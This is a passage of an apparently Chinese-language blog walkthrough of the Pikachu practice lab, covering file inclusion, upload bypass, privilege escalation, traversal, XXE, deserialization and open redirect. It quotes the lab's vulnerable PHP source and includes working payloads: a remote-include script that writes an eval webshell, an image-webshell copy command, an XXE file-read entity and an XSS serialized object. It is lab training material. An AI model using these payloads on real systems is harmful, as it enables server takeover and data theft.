keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"include/<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这里可以进行目录穿越，读取本机文件</strong></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214202652400.png"></p><h3 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h3><p><strong>前提</strong></p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token constant">allow_url_fopen</span><span class="token attr-value"><span class="token punctuation">=</span>on //默认打开</span><span class="token constant">allow_url_include</span><span class="token attr-value"><span class="token punctuation">=</span>on //默认关闭</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这里只能读取txt文件，这里把txt解析成php执行</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"yijuhua.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php @eval($_POST['</span>x<span class="token string single-quoted-string">']);?>'</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;test&#x2F;yijuhua.txt访问它，执行php函数，生成一个php木马再连上去<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Unsafe-FileDownload（不安全文件下载）"><a href="#Unsafe-FileDownload（不安全文件下载）" class="headerlink" title="Unsafe FileDownload（不安全文件下载）"></a>Unsafe FileDownload（不安全文件下载）</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。从而导致后台敏感信息(密码文件、源代码等)被下载。                     </p><p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。切记：所有与前端交互的数据都是不安全的，不能掉以轻心！      </p></blockquote><p> 由于我是搭在本地的，所以点图片会直接打开</p><p><strong>在线下载的话可以根据下载链接进行目录穿越，下载其他文件</strong>             </p><h2 id="Unsafe-Upfileupload（不安全文件上传）"><a href="#Unsafe-Upfileupload（不安全文件上传）" class="headerlink" title="Unsafe Upfileupload（不安全文件上传）"></a>Unsafe Upfileupload（不安全文件上传）</h2><blockquote><p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。                    </p><p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>-等等…</p></blockquote><p><strong>这里只允许上传图片</strong></p><h3 id="client-check（客户端验证）"><a href="#client-check（客户端验证）" class="headerlink" title="client check（客户端验证）"></a>client check（客户端验证）</h3><p><strong>方法一：改本地js代码</strong></p><p><strong>方法二：BP拦截重发</strong></p><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><blockquote><p><strong>MIME（Multipurpose Internet Mail Extensions）多用途互连网右键扩展类型。</strong></p><p><strong>当一个浏览器对一个文件进行识别的时候，他会给文件定义一个类型，放在http的头部的Content-type里面，比如上传图片，就会自动识别是jpg或者png等</strong></p></blockquote><p><strong>不该文件名，抓包修改MIME也就是<code>Content-Type</code>上传</strong></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>图片验证</p><p>做图片马就行</p><p><strong>1.copy命令</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">copy <span class="token number">1</span>.jpg/b + <span class="token number">1</span>.php/a <span class="token number">2</span>.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.二进制编辑器</strong></p><p>在后面加上木马就行</p><p><strong>3.PS插入</strong></p><p>可能还有其它一些方法</p><h2 id="Over-permission（越权）"><a href="#Over-permission（越权）" class="headerlink" title="Over permission（越权）"></a>Over permission（越权）</h2><blockquote><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为<code>越权操作</code>。  越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p><p>因此，在在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p></blockquote><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><blockquote><p><strong>A用户和B用户属于同一级别用户，但各自不能操作对方个人信息。A用户如果越权操作B用户个人信息的情况称为水平越权操作。</strong></p></blockquote><p>根据提示可以看到有三个用户</p><p>随便登录其中一个比如lucy</p><p>把url中的lucy改成其他用户的名字就可以看到其他用户的信息，而无需输入其他人的密码</p><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 判断是否登录，没有登录不能访问</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check_op_login</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:op1_login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定</span>    <span class="token variable">$username</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from member where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><blockquote><p><strong>A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</strong></p></blockquote><p>拿管理员账户登进去</p><p>添加一个用户，抓包</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214210920505.png"></p><p>再拿普通用户登录</p><p>同样添加用户，抓包，把它的登录cookie复制到原来管理员新建成员的那个请求里，Forward提交</p><p>再刷新下，就可以看到又新建了一个用户</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214211548275.png"></p><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 判断是否登录，没有登录不能访问</span><span class="token comment">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check_op2_login</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:op2_login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//用户名密码必填</span>        <span class="token variable">$getdata</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//转义</span>        <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into member(username,pw,sex,phonenum,email,address) values('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>',md5('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>'),'<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sex'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phonenum'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>')"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_affected_rows</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//判断是否插入</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:op2_admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p>修改失败,请检查下数据库是不是还是活着的&lt;/p>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="（目录遍历）"><a href="#（目录遍历）" class="headerlink" title="../../../（目录遍历）"></a>../../../（目录遍历）</h2><blockquote><p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。  在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。  从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p><p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p><p>需要区分一下的是,如果你通过不带参数的url（比如：<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%8C%E8%80%8C%E5%B9%B6%E4%B8%8D%E5%BD%92%E4%B8%BA%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露，而并不归为目录遍历漏洞。</a></p></blockquote><p>修改URL中的title参数实现目录遍历</p><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//这里直接把传进来的内容进行了require(),造成问题</span>    <span class="token keyword">require</span> <span class="token string double-quoted-string">"soup/<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span class="token comment">//    echo $html;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><blockquote><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p></blockquote><p>根据提示，审查源码发现一个测试账号</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214212459831.png"></p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><blockquote><p>之前的笔记有介绍：<a href="https://anwar.top/2021/01/15/php-fan-xu-lie-hua/">https://anwar.top/2021/01/15/php-fan-xu-lie-hua/</a></p></blockquote><p>随便序列化弹个框</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"S"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"&lt;script>alert('AAA')&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="XXE（XML外部实体注入攻击）"><a href="#XXE（XML外部实体注入攻击）" class="headerlink" title="XXE（XML外部实体注入攻击）"></a>XXE（XML外部实体注入攻击）</h2><blockquote><p>XXE -“xml external entity injection” 即”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p></blockquote><p><strong>XML是可扩展的标记语言（E<code>X</code>tensible <code>M</code>arkup <code>L</code>anguage），设计用来进行数据的传输和存储， 结构是树形结构，由标签构成，这点很像HTML语言。但是XML和HTML有明显区别如下：</strong></p><pre class="line-numbers language-none"><code class="language-none">XML 和 HTML 为不同的目的而设计：XML 被设计用来传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>XML大致语法：</strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">第一部分：XML声明部分<span class="token prolog">&lt;?xml version="1.0"?></span>第二部分：文档类型定义 DTD<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">[</span><span class="token internal-subset"> <span class="token comment">&lt;!--定义此文档是note类型的文档--></span>&lt;!ENTITY entity-name SYSTEM "URI/URL"><span class="token comment">&lt;!--外部实体声明--></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>第三部分：文档元素<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Dave<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Tom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>You are a good man<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">内部申明DTD格式<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token punctuation">[</span><span class="token internal-subset">元素申明</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>外部引用DTD格式<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token name">SYSTEM</span> <span class="token string">"外部DTD的URI"</span><span class="token punctuation">></span></span>引用公共DTD格式<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token name">PUBLIC</span> <span class="token string">"DTD标识名"</span> <span class="token string">"公共DTD的URI"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>内部实体引用</strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version = "1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">hacker</span> <span class="token attr-name">"Hello!"</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hacker;">&amp;hacker;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210214213853922.png"></p><p><strong>外部实体引用</strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY f SYSTEM "file://文件路径"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//考虑到目前很多版本里面libxml的版本都>=2.9.0了,所以这里添加了LIBXML_NOENT参数开启了外部实体解析</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$xml</span> <span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//    $xml = $test;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'SimpleXMLElement'</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$data</span><span class="token punctuation">&#125;</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><blockquote><p>不安全的URL跳转问题可能发生在一切执行了URL地址跳转的地方。<br>如果后端采用了前端传进来的参数(可能是用户传参,或者之前预埋在前端页面的URL地址)作为了跳转的目的地,而又没有做判断的话就可能发生”跳错对象”的问题。</p><p>URL跳转比较直接的危害是:–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p></blockquote><p>一共四个超链接</p><p>细心点发现最后一个URL带参数</p><p>把i改成其他网址诱导别人点进去，从而达到钓鱼的目的</p><p>源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token 